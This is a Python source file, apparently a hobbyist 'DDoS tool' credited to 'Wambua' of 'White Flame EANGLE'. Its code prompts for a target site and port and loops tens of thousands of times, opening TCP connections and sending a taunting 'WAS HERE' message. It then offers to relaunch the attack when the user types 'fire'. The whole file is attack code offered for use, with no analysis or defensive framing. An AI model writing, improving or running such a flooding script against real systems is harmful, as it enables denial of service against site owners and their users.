# TOOLS DDOS BY Wambua
# import time
import socket
import os
import sys
from .banner import flag
from .mytimer import dynamic_countdown


baner = """
\033[1;96m|###################################################################|
\033[1;96m|###|               Author By : Wambua                          |###|
\033[1;96m|###|               code      : Python3                         |###|
\033[1;96m|###|               Team      : White Flame EANGLE              |###|
\033[1;96m|###################################################################|
"""
flag
print(baner)


def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)


try:
    curdir = os.getcwd()
    print("\033[1;91minput web url \033[1;95m[ex : www.Example.com ]")
    host = input("\033[1;94mWFE@root : ")
    print("\033[1;91minput port \033[1;95m[ex : 8080 ]")
    port = input("\033[1;94mWFE@root : ")
except ValueError as e:
    print(e)
    sys.exit(1)
except KeyboardInterrupt:
    print("\nExiting..")
    sys.exit(1)

if port == "":
    port = 80
port = int(port)
try:
    connect = 50000
    ip = socket.gethostbyname(host)

    print(f"\033[1;91m Attacking \033[1;93m[{host}]\033[0m")
    print("\033[1;91m Attack to target ip \033[1;93m[" + ip + "]" + "\
\033[1;91m is inbound\033[0m")
    message = b"WHITE FLAME, THE FLAMING EANGLE SYSTEM WAS HERE..."
    dynamic_countdown(3)
    print("\033[1;91mFIRE..............................\033[0m")
except KeyboardInterrupt:
    print("\nExiting")
    sys.exit(1)
except Exception as e:
    print(e)


def dos():
    # pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send(message)
        ddos.sendto(message, (ip, port))
        ddos.send(message)
        print(f"\033[1;92mSending \033[1;33m{counter} \033[1;92mpayload to \033[1;35m[" + ip + "] ...\033[0m", end="\r")
        ddos.close()
    except KeyboardInterrupt:
        print("\nExiting..")
        sys.exit(1)
    except socket.error:
        print("\033[1;91m ...no connection to [" + ip + "] ...")


counter = 0
for i in range(1, connect):
    try:
        counter += 1
        dos()
    except KeyboardInterrupt:
        print("Exiting...")
        sys.exit()
print("Ddos is stopping.........")


if __name__ == "__main__":
    restart_program()
    answer = input("Do you want to continue DDoS ??? Type 'fire'...")
    if answer.strip() in "y, Y, fire, Fire, FIRE".split():
        restart_program()
    # else:
    # os.system(curdir+"main.py")'''
